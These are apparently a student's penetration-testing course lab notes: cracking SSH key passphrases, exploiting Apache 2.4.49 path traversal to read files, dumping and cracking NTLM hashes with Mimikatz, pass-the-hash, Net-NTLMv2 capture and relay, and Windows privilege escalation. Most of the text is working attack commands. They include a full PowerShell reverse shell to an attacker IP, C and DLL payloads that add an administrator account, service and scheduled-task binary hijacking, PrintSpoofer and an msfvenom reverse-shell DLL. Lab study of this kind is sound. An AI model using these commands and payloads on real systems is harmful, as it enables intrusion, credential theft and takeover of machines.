```bash
>chmod 600 id_rsa
>ssh -i id_rsa -p 2222 dave@192.168.189.201 (# tried with 6 passwords avaliable in the note.txt noting worked out)
>ssh -i id_rsa -p 2222 dave@192.168.189.201
>ssh2john id_rsa > ssh.hash
>cat ssh.hash (# check below screenshot for checking hashing type)
```

![Untitled](Untitled%2061.png)

![Untitled](Untitled%2062.png)

```bash
>hashcat -h | grep -i "ssh" (# Check above snap for referenece)
└─$ cat note.txt (# password list)
Window
rickc137
dave
superdave
megadave
umbrella
#If you observe the pattern Window & rickc137 so procedded with 
First Captital and 3 numbers like 137 then no special charater using most used ones ! @ #
└─$ cat ssh.rule 
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
>hashcat -m 22921 ssh.hash note.txt -r ssh.rule --force 
#No hsshes are loaded due size off ssh.hash  
>sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'    
>john --wordlist=note.txt --rules=sshRules ssh.hash (**Umbrella137!**     (id_rsa))
>ssh -i id_rsa -p 2222 dave@192.168.222.201
#Enter passphrase abobe to login into shell (**Umbrella137!**)
```

Another machine with nmap result port 22,80,222  Apache httpd 2.4.49

![Untitled](Untitled%2063.png)

```bash
#Nmap Result
└─$ nmap -A -T4 192.168.222.201
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-30 15:37 EDT
Nmap scan report for 192.168.222.201
Host is up (0.065s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.49 ((Unix))
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds
#Added into text file
>cat targets.txt 
http://192.168.222.201/
>./50383.sh targets.txt /etc/passwd  
#Provided users in the machine(alfred:x:1000:1000::/home/alfred:/bin/bash)
>./50383.sh targets.txt /home/alfred/.ssh/id_rsa
#Provided SSH key Follow same above process
First Captital and 3 numbers like 137 then no special charater using most used ones ! @ #
└─$ cat ssh.rule 
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
>hashcat -m 22921 ssh.hash rockyou.txt -r ssh.rule --force 
#No hsshes are loaded due size off ssh.hash  
>sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'    
>john --wordlist=rockyou.txt --rules=sshRules ssh.hash (**Superstar137!**    (id_rsa) )
>ssh -i id_rsa -p 2222 alfred@192.168.222.201
#Enter passphrase abobe to login into shell (**Superstar137!**)
```

## Working with Password Hashes

### Cracking NTLM

we begin cracking NTLM hashes, let's discuss the NTLM hash implementation and how it is used. Then, we'll demonstrate how we can obtain and crack NTLM hashes in Windows. which extracts password hashes from the ***Local Security Authority Subsystem* (LSASS)** process memory

**C:\Windows\system32\config\sam**

```bash
#Windows login with credentials
#Open Powershell
>Get-LocalUser (FInd who are available users here found offsec, nelly,sam)
#Open must Powershell with administrator privileges to dump passwords
>privilege::debug
>sekurlsa::logonpasswords
>token::elevate(# Get admin access to read passwords)
>lsadump::sam(Dump nelly NTLM hash 3ae8e5f0ffabb3a627672e1600f1ba10)
>cat nelly.hash
3ae8e5f0ffabb3a627672e1600f1ba10
>hashcat -m 1000 nelly.hash rockyou.txt --force (This hash cracked with this and below command)
>hashcat -m 1000 nelly.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

###Another Machine
>hydra -l nadine -P rockyou.txt rdp://192.168.222.227 -t 20 (Found - 123abc)
#Login with xfreerdp
>privilege::debug
>token::elevate
>lsadump::sam (Steve hash is 2835573fb334e3696ef62a00e5cf7571)
>hashcat -m 1000 steve.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (francesca77)
```

### Passing NTLM

In the last section, we obtained an NTLM hash and cracked it. Depending on the strength of the password the may be time-consuming or unfeasible. In this section, we’ll demonstrate how we can leverage an NTLM hash without cracking it. *pass-the-hash* (PtH) technique.

we can use ***smbclient*** or ***CrackMapExec***. For command execution, we can use the scripts from the *impacket* library like ***psexec**.py* and ***wmiexec**.py*. We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and ***WinRM***,  if the user has the required rights. We can also use **Mimikatz** to conduct pass-the-hash as well.

#LMHash:NTHash - 32 0's:NTLM hash

```bash
#In this task provided 2 Machines
#192.168.206.211 (gunther / password123!), 192.168.206.212 (NO credes find flag)
>xfreerdp /v:192.168.206.211  /u:gunther /p:password123!
>privilege::debug
>token::elevate
>lsadump::sam (Got hash of administrator - 7a38310ea6f0027ee955abed1762964b)
>smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
>dir
#First Method
>get secrets.txt (# INside the file has - this is secret )
#LMHash:NTHash - 32 0's:NTLM hash
>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.206.212
>hostname
>ipconfig
>whoami (# Get flag in Administrator's Desktop folder)
>exit
#another Method
>impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.206.212
>whoami (# Get flag in Administrator's Desktop folder)
>C:\>type \Users\Administrator\Desktop\flag.txt
```

### Cracking Net-NTLMv2

In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user. This means that we cannot use tools like Mimikatz to extract passwords or NTLM hashes. In situations like these, we can abuse the *Net-NTLMv2* network authentication protocol. This protocol is responsible for managing the authentication process for Windows clients and servers over a network.
`*We use "Net-NTLMv2" to refer to the formally correct NTLMv2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.*`
`If you Don’t have access to admin with Mimikatz then use responder tool`

```bash
#192.168.206.211 Bind shell running on the target connect with netcat
>nc 192.168.206.211 4444 (#user paul with privileges, found flag of paul user)
#(Local Group Memberships      *Remote Desktop Users *Users                
#Global Group memberships     *None)
#Since we don't know the password of paul user to login xfreerdp, then using **responder** tool
>nc 192.168.206.211 4444 (dir \\192.168.45.212\test (tun0), run this sample command)
>sudo responder -I tun0 (paul::FILES01:233c6331a0b757b3:C36B6195AEEF16CB5EA631E63537026F:010100000000000080F71E709E83DA012DFEA68F5ECA8EBE00000000020008004E004F004800580001001E00570049004E002D00480041004E00340056004B005900470057005500420004003400570049004E002D00480041004E00340056004B00590047005700550042002E004E004F00480058002E004C004F00430041004C00030014004E004F00480058002E004C004F00430041004C00050014004E004F00480058002E004C004F00430041004C000700080080F71E709E83DA010600040002000000080030003000000000000000000000000020000007881F41001452D857AC74E8A55F778CFB5F7821B51A2A755405199AF27D41A80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310032000000000000000000 )
>hashcat --help | grep -i "ntlm" ( 5600 | NetNTLMv2| Network Protocol)
>hashcat -m 5600 paul.hash rockyou.txt --force (123Password123) (#put hash into paul.hash)
>xfreerdp /v:192.168.206.211  /u:paul /p:123Password123

# Another Machine hash found in web appllication **Below screenshot**
#Use website upload the file (**Below parameters in burpsute**)
#Content-Disposition: form-data; name="myFile"; filename="**\\\\192.168.45.212\\nonolder.txt**"
#**Content-Type: text/plain (If these steps are correct you'll get below hash)**
>sudo responder -I tun0 (sam::MARKETINGWK01:3235f4430d298122:2A58EE496E39BD5F5DBE8C24B24873EC:010100000000000000AD29F4A783DA01978770401DE54D9300000000020008004E0059004700480001001E00570049004E002D004700450036004F00510038005A00370039004C00540004003400570049004E002D004700450036004F00510038005A00370039004C0054002E004E005900470048002E004C004F00430041004C00030014004E005900470048002E004C004F00430041004C00050014004E005900470048002E004C004F00430041004C000700080000AD29F4A783DA01060004000200000008003000300000000000000000000000002000001DC12DC88669D8CCF56810BF0CE4E13D7759698F69F1985ADC012019BAD79FF80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310032000000000000000000)
>hashcat -m 5600 sam.hash rockyou.txt --force (DISISMYPASSWORD) (#put hash into sam.hash)
```

![Untitled](Untitled%2064.png)

### Relaying Net-NTLMv2 (powershell oneliner)

In this section, we’ll have access to FILES01 as an unprivileged user (files02admin), which means we cannot run Mimikatz to extract passwords. Using the step from the previous section, imagine we obtained the Net-NTLMv2 hash, but couldn’t crack it because it was too complex.

What we can assume based on the username is that the user may be a local administrator on FILES02. Therefore, we can try to use the hash on another machine in what is know as relay attack.

```bash
#powershell oneliner user **pwsh in kali linux (below screenshot)**
kali with pwsh>$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.212",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
kali with pwsh>$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
kali with pwsh>$EncodedText =[Convert]::ToBase64String($Bytes)
kali with pwsh>$EncodedText
```

![Untitled](Untitled%2065.png)

```bash

>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.206.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
>nc -nlvp 8080 (One terminal, we get reverse shell here)
>nc 192.168.206.211 5555 (#Another terminal, nmap result has 5555tcpwrapped,)
>nc 192.168.206.211 5555 (enter this command after connecting the shell dir \\192.168.45.212\test)
Once you enter dir, One terminal shell will be connected
```

![Untitled](Untitled%2066.png)

Once enter the dir \\192.168.45.212\test (Kali IP), You will see below log related to authentication

![Untitled](Untitled%2067.png)

you will get reverse shell after authentication logs

![Untitled](Untitled%2068.png)

```bash
#Capstone machine
#Capstone Exercise: Find a way to obtain a Net-NTLMv2 hash from the user anastasia via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02)
#192.168.206.212 (VM#4)192.168.206.202(VM#3)
#Relaying is using relay command(listening smb or connections) 
#using **impacket-ntlmrelayx(more heavily then responder), responser**
```

![Untitled](Untitled%2069.png)

![Untitled](Untitled%2070.png)

run this below command dir \\192.168.45.212\test (kali IP), you will get **above screenshot** authentication logs, then below reverse shell connected

![Untitled](Untitled%2071.png)

you will reverse shell

![Untitled](Untitled%2072.png)

# 16 Windows privilege Escalation

During a penetration test, we often gain our initial foothold on a Windows system as an unprivileged user. However, we usually need administrative privileges to search for sensitive information in other users' home directories, examine configuration files on the system, or extract password hashes with *Mimikatz*. The process of elevating our privileges and access from unprivileged to privileged is called *Privilege Escalation*. Finally *Scheduled Tasks.*

## Enumerating Windows

- Understand Windows privileges and access control mechanisms
- Obtain situational awareness
- Search for sensitive information on Windows systems
- Find sensitive information generated by PowerShell
- Become familiar with automated enumeration tools

### Understanding Windows Privilege and Access Control Mechanisms

> `S-1-5-21-1336799502-1441772794-948155058-**1001**`
`S-R-X-Y`
> 
- The first part is a literal "S", which indicates that the string is a SID.
- "R" stands for *revision* and is always set to "1", since the overall SID structure continues to be on its initial version.
- "X" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies *NT Authority* and is used for local or domain users and groups.
- "Y" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and *relative identifier* (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups.

```
S-1-0-0                       Nobody
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

### Situational Awareness

There are several key pieces of information we should always obtain:

```
- Username and hostname - whoami
- Group memberships of the current user - whoami /group
   - Existing users and groups -powershell->Get-LocalUser/Get-LocalGroup/
   Get-LocalGroupMember adminteam/Get-LocalGroupMember Administrator
- Operating system, version and architecture - systeminfo
- Network information - ipconfig /all, route print, netstat -ano
- Installed applications - 
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname / Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname / Get-Process
- Running processes
```

flag → Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*”

>Get-Process (find the path)

>Get-Process -Name <ProcessName> | Select-Object -ExpandProperty Path

### Hidden in Plain View

Windows OS with some passwords are hidden

 

```markdown
>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
>type C:\xampp\passwords.txt
>type C:\xampp\mysql\bin\my.ini (# No permission for dave user)
>Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
>cat Desktop\asdf.txt
>net user steve(He is into the Remote Desktop Users, And then logged in with Steve User)
>type C:\xampp\mysql\bin\my.ini (We can able see the data)
>net user backupadmin
>runas /user:backupadmin cmd (#Ask for password of backupadmin user enter password then login as users account)
# Search for Windows flag using powershell windows
> Get-ChildItem -Path C:\Users\steve -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

### Information Goldmine PowerShell

In the previous section identified user .txt and .ini files to find credentials of the user this part of the module we going dive in the users history to find what kind of commands user searching 

```markdown
#Powershell
>Get-History (#If you don't find any information user might deleted or not executed any commands)
>(Get-PSReadlineOption).HistorySavepath
>type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
>type C:\Users\Public\Transcripts\transcript01.txt (#Above command reveled path of this file)
>$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force (# found password in above command)
>$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
>Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
>whoami (# daveadmin, this user desktop having flag but unable to open flag, changing Winrm command)
#Kali
>evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
>whoami (# user daveadmin, and find flag in desktop folder)
#Another challenge login with daveadmin with xfreerdp
#Search for  Event Viewer to search for events recorded by Script Block Logging
#path is Event Viewer >Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
#Another 
>(Get-PSReadlineOption).HistorySavePath
>type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
# Flag available in above command
```

### Automated Enumeration

In the previous three sections, we manually enumerated CLIENTWK220. We gathered information, which led us to two different ways to elevate our privileges. However, this took us quite some time to do. In real-life penetration test for a client, we often have time constraints, limiting the time we can take to enumerate systems in a manual way.

winpeas - [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

```markdown
#Download Winpeas
>nc 192.168.248.220 4444
>powershell
>iwr -uri http://192.168.45.208/winPEASx64.exe -Outfile winPEAS.exe
>.\winPEAS.exe (#DPAPI Credential Files, save the output in the in text file like > saved.txt and then search in saved.txt)
#Another Machine (search engine type 'compiled seatbelt github download')
>iwr -uri http://192.168.45.208:1234/Seatbelt.exe -Outfile Seatbelt.exe
>.\Seatbelt.exe -group=all (#Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.)
```

## Leveraging Windows Services - adduser.c

Windows services are one of the main areas to analyze when searching for privilege escalation vectors.

- Hijack service binaries
- Hijack service DLLs
- Abuse Unquoted service paths

### Service Binary Hijacking

Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state.

For this section, let's consider a scenario in which a software developer creates a program and installs an application as a Windows service. During the installation, the developer does not secure the permissions of the program, allowing **full Read and Write access to all members of the Users group. As a result, a lower-privileged user could replace the program with a malicious one.** To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine. Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as *LocalSystem*.

> *When using a network logon such as **WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied"** error when querying for services with a non-administrative user. **Using an interactive logon such as RDP solves this problem.***
> 

![Untitled](Untitled%2073.png)

```markdown
"linux kernel Ubuntu"linux kernel Ubuntsearchsploit ""linuxPS>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
>icacls "C:\xampp\apache\bin\httpd.exe" (# RX permission to User)
>icacls "C:\xampp\mysql\bin\mysqld.exe" (# Full permission to User)
#Let's create a small binary on Kali, which we'll use to replace the original mysqld.exe. The following C code will create a user named dave2 and add that user to the local Administrators group using the system5 function. The cross-compiled version of this code will serve as our malicious binary. Let's save it on Kali in a file named adduser.c
kali>cat adduser.c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
kali>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe (#Compile this file)
PS>iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
>move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
>move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
>net stop mysql (#Access is denied for dave user)
>Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
#USing above ,ysql service is automatic start mode
>whoami /priv (# their is no Showdown permission, reboot, but it cannot be done in client due to downtime issues
>shutdown /r /t 0
>Get-LocalGroupMember administrators (#USer dave2 available on the administrator group)
Kali>cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
>python3 -m http.server 80
>iwr -uri http://192.168.45.208/PowerUp.ps1 -Outfile PowerUp.ps1
>powershell -ep bypass
>. .\PowerUp.ps1
>Get-ModifiableServiceFile (# Gives recently modified files finds mysqld file is modified)
>Install-ServiceBinary -Name 'mysql'(# no permission to change)
>$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
>$ModifiableFiles
>$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
>$ModifiableFiles
>$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 
>$ModifiableFiles
>runas /user:dave2 cmd (#password is - password123!, not login as RDP)
```

Connect to *CLIENTWK221* (VM #2) via RDP as user *milena* with the password *MyBirthDayIsInJuly1!*. Find a service in which *milena* can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.

```markdown
PS>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
#Identified Backupmonitor followed same step, got roy user flag using RDP
```

### Service DLL Hijacking - myDLL.dll

Replacing the binary of a service is a very effective way to attempt privilege escalation on Windows systems. However, because our user doesn't often have permissions to replace these binaries, we'll need to adapt with a more advanced way of abusing Windows services.

DLL Search Order

![Untitled](Untitled%2074.png)

```markdown
kali>cat myDLL.cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
       i = system ("net user dave2 password123! /add");
       i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```markdown
PS>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Above command reveals that service running on user steve BetaService-Running C:\Users\steve\Documents\BetaServ.exe
>icacls .\Documents\BetaServ.exe (# USer steve have RX permission)
# Check the process monitor for Beta Service not available
>Restart-Service BetaService (# Restart service)
# After restarting service Beta Service available after filtering in the process monitor
>$env:path (#DLL Search Order check above for order)
kali>x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll (#Compile the code)
PS>cd Documents (#Changing the directory because 5 rule of searching DLL is Current directory)
>iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
>net user (# in this command dave2 user is not created because DLL is not loaded after copied the directory so restart the service)
>Restart-Service BetaService (# Restart service)
>net user (#user dave2 is availablafter restarting)
>net localgroup administartors(# user dave2 available on the admins group)
>change daveadmin user desktop find flag or login with RDP
```

### Unquoted Service Paths

Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around *unquoted service paths*. **We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them**.

```markdown
C:\Program.exe
#C:\Program Files\My.exe
# C:\Program Files\My Program\My.exe --- #**path of this file contains one or more spaces**
# C:\Program Files\My Program\My service\service.exe ---# **path of this file contains one or more spaces and is not enclosed within quotes**
```

As we learned in the previous sections, **each Windows service maps to an executable file that will be run when the service is started**. If the **path of this file contains one or more spaces and is not enclosed within quotes, it may be turned into an opportunity for a privilege escalation attack**.

```markdown
PS>Get-CimInstance -ClassName win32_service | Select Name,State,PathName
#above commands reveals GammaService -Stopped-C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
cmd>wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
C:\Users\steve>wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
BetaService       C:\Users\steve\Documents\BetaServ.exe                                        
GammaService      C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe    LSM                                                                                                                     
mysql             C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysqlNetSetupSvc
PS>Start-Service GammaService (#we can able to start and stop the service)
PS>Stop-Service GammaService
#let's list the paths Windows uses to attempt locating the executable file of the service.
#C:\Program.exe
#C:\Program Files\Enterprise.exe
#C:\Program Files\Enterprise Apps\Current.exe
#C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
PS>icacls "C:\"
PS>PS>icacls "C:\Program FIles"
<!--- Comments on permissions
(OI): Object Inherit
This permission is inherited by objects placed in the container.
It applies to subfolders and files within the directory.
(CI): Container Inherit
This permission is inherited by subcontainers placed in the container.
It applies to subfolders within the directory.
(IO): Inherit Only
This permission is inherited (see OI and CI), but does not apply to the current object itself.
It is typically used for directories.
(GR): Generic Read
Allows reading data from the object.
(GE): Generic Execute
Allows executing the object (e.g., running a program).
For files, the permission masks are more straightforward: R means read access, X allows execution, and so on.
--> End  Comments on permissions
PS>icacls "C:\Program Files\Enterprise Apps" (# Write permission - BUILTIN\Users:(OI)(CI)(RX,W))
PS>iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
PS>copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
PS>Start-Service GammaService (# we got erro but still user dave2 is created)
>Start-Service GammaService
>net user
>Get-LocalGroupMember administrators (# dave2 is part of administrators)
>net localgroup administrators
#Checking Unquoted with PowerUp.ps1
>iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
>powershell -ep bypass
>. .\PowerUp.ps1
>Get-UnquotedService
>Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
>Restart-Service GammaService
>net user (#It creates john-user & passowrd-Password123!)
>net localgroup administrators
#Get the flag login using RDP or runas command
```

#Another Machine - ReynhSurveillance.exe

```markdown
#C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
C:\Enterprise Software\Monitoring Solution\Surveillance.exe 
#Followed same above procedure
```

## Abusing Other Windows Components

- Leverage Scheduled Tasks to elevate our privileges
- Understand the different types of exploits leading to privilege escalation
- Abuse privileges to execute code as privileged user accounts

### Scheduled Tasks

**Windows uses the *Task Scheduler* to execute various automated tasks, such as clean-up activities or update management. On Windows, they are called Scheduled Tasks, or *Tasks*, and are defined with one or more triggers.** A trigger is used as a condition, causing one or more actions to be executed when met. For example, a trigger can be set to a specific time and date, at startup, at log on, or on a Windows *event*. An action specifies which program or script to execute. There are various other possible configurations for a task, categorized in the *Conditions*, *Settings*, and *General* menu tabs of a task's property.

- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

```markdown
PS>schtasks /query /fo LIST /v (#Identified TaskName:\Microsoft\CacheCleanup, It will be executed every one minute)
>icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe (# Full permission to user steve)
>iwr -uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
>iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
>move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak (#Moving for backup)
>move .\BackendCacheCleanup.exe .\Pictures\
>net user (# After waiting for one minute, task will be executed and dave2 user will be created)
#Get flag login using RDP of dave2 user
#Next lab identified C:\Users\moss\Searches\VoiceActivation.exe
```

### Using Exploits

- *application-based* vulnerabilities. Installed applications on a Windows system
- *Windows Kernel*.[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/abusing-other-windows-components/using-exploits#fn1) However, the vulnerability research and related exploit techniques
- Non-privileged users with assigned privileges, such as *SeImpersonatePrivilege*

```markdown
>nc 192.168.50.220 4444
>whoami /priv (#SeImpersonatePrivilege-Impersonate a client after authentication-Enabled)
kali>wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
cmd>powershell
PS>iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe
>whoami (# Administrator)
```

### Capstone Machine - Backup privilege

[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

```markdown
Capstone Exercise: Get access to CLIENTWK222 (VM #2) by connecting to the bind shell on 
port 4444. Use the methods covered in this Module to elevate your privileges to an 
administrative user. Enter the flag, which is located in 
C:\Users\enterpriseadmin\Desktop\flag.txt.
1) Connect to port 4444 on your assigned VM #2.
2) Use the command in Listing 18 to search for text files in the C:\users directory, for any user and password information.
3) Access RDP using the found credentials. Check for unusual services with write permissions using the command in Listing 40.
4) Restart the service with your malicious .dll payload for higher privileges (enterpriseuser).
5) Check your privileges (whoami /priv).
6) Note that the Spooler service is stopped, so the PrintSpoofer exploit won't work.
7) If a privilege is Disabled (SeBackupPrivilege) and present, you can still attempt it and try retrieving the flag by copying the Desktop contents of the enterpriseadmin user in this case.
alex:WelcomeToWinter0121

>nc 192.168.204.222 4444
>Got alex password in the diana note2.txt (alex:WelcomeToWinter0121)
kali>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.208  LPORT=1212 -f dll -o EnterpriseServiceOptional.dll
